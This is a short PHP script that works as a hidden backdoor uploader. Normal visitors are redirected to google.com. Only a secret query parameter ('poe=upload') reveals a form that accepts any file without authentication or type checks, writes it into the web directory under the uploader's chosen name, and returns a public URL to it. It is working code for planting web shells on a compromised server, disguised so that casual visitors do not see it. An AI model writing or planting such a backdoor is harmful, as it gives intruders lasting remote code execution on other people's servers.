<?php
if (isset($_GET['poe']) && $_GET['poe'] === 'upload') {
    $uploaded = false;
    $link = '';

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
        $target = __DIR__ . '/' . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            $uploaded = true;
            $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
            $host = $_SERVER['HTTP_HOST'];
            $path = str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME']));
            $link = $scheme . '://' . $host . rtrim($path, '/') . '/' . $_FILES['file']['name'];
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <title>Upload</title>
        <style>
            body { background:#111; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:sans-serif; }
            form { background:#1a1a1a; padding:30px; border-radius:8px; border:1px solid #333; text-align:center; }
            input[type="file"] { color:#ccc; margin-bottom:15px; }
            input[type="submit"] { background:#0f0; color:#000; border:none; padding:10px 25px; border-radius:4px; cursor:pointer; font-weight:bold; }
            .link { color:#0f0; margin-top:15px; word-break:break-all; }
        </style>
    </head>
    <body>
        <?php if ($uploaded): ?>
            <div class="link"><?php echo htmlspecialchars($link); ?></div>
        <?php else: ?>
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="file">
                <br>
                <input type="submit" value="Upload">
            </form>
        <?php endif; ?>
    </body>
    </html>
    <?php
    exit;
}

header('Location: https://google.com/');
exit;